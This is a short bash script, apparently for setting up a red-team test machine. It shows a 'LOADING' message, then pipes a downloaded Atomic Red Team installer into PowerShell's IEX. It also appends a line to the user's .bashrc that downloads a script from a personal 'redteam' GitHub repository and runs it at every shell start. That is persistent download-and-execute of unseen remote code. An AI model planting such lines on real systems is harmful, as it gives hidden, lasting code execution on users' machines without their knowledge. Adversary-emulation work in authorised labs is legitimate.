#!/bin/bash
clear
echo    LOADING . . .
pwsh -Command "IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics" -Force > /tmp/pwsh_output.log 2>&1
#echo 'pwsh -Command "IEX (IWR ''https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'' -UseBasicParsing); Install-AtomicRedTeam -getAtomics" -Force' >> /home/ubuntu/.bashrc
echo 'curl -o /tmp/install_remote.sh https://raw.githubusercontent.com/ivanba-arch/redteam/main/install_d.sh && chmod +x /tmp/install_remote.sh && /tmp/install_remote.sh' >> /home/ubuntu/.bashrc
echo "Script completed" > /tmp/script_status.log
